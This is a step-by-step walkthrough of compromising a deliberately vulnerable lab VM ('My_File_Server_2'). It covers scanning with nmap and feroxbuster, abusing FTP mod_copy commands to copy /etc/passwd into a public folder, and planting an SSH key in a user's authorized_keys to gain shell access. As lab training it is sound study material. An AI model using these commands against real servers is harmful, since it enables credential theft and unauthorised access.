<div class="page">

# My_File_Server_2

\

## 

## My_File_Server_2

- **<span style="color:#cdab8f;">My_File_Server_2</span>** :-

<!-- -->

- Go to repo :
  <https://github.com/InfoSecWarrior/Offensive-Pentesting-Lab/tree/main/Vulnerable-OVA>
- Download the machine .

<!-- -->

- Import the machine in virtual box .

<!-- -->

- Find the machine ip :

<div class="codebox">

    nmap -sn 192.168.2.0/24 

</div>

![](images/10-1.png)

- Find the available port :

<div class="codebox">

    nmap -v -p- 192.168.2.240

</div>

![](images/10-2.png)

- Visit the ip in browser : <http://192.168.2.240/>

<!-- -->

- Find the hidden endpoints :

<div class="codebox">

    feroxbuster -u http://192.168.2.240/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt

</div>

![](images/10-3.png)

- Visit the endpoints : <http://192.168.2.240/index.html>
  <http://192.168.2.240/readme.txt>

![](images/10-4.png)

- Now try to login ftp :

<div class="codebox">

    ftp 192.168.2.240

</div>

![](images/10-5.png) Show the vsFTPd version .

<div class="codebox">

    ftp 192.168.2.240 2121

</div>

![](images/10-6.png)

<div class="codebox">

    ftp 192.168.2.240 2121

</div>

![](images/10-7.png)

- Now again login port 2121 and run the command :

<div class="codebox">

    ftp 192.168.2.240 2121

</div>

<div class="codebox">

    help

</div>

<div class="codebox">

    site help

</div>

<div class="codebox">

    site cpfr /etc/passwd

</div>

<div class="codebox">

    site cpto /var/ftp/pub/passwd

</div>

![](images/10-8.png)

- Now exit and again login :

![](images/10-9.png)

- Now download the passwd file and see the content :

![](images/10-10.png) Here the passwd file content .

- Now try to login smbuser in ftp :

![](images/10-11.png)

- Anonymous check with smbclient :

<div class="codebox">

    smbclient -L //192.168.2.240

</div>

![](images/10-12.png)

<div class="codebox">

    smbclient //192.168.2.240/smbdata

</div>

![](images/10-13.png)

- Now generate rsa_key :

<div class="codebox">

    ssh-keygen -b 2048 -t rsa -f id_rsa -q -N ""

</div>

![](images/10-14.png)

- Login with smb user and put the rsa file :

<div class="codebox">

    smbclient //192.168.2.240/smbdata

</div>

![](images/10-15.png)

- Login FTP and rsa_key file transfer in smbdata :

<div class="codebox">

    ftp 192.168.2.240 2121

</div>

- 

<div class="codebox">

    site help

</div>

- 

<div class="codebox">

    site cpfr /smbdata/id_rsa.pub

</div>

- 

<div class="codebox">

    site cpto /home/smbuser/.ssh/authorized_keys

</div>

![](images/10-16.png)

- Now login with ssh :

<div class="codebox">

    ssh -i id_rsa smbuser@192.168.2.240

</div>

![](images/10-17.png)

- Login with root :

![](images/10-18.png)

</div>
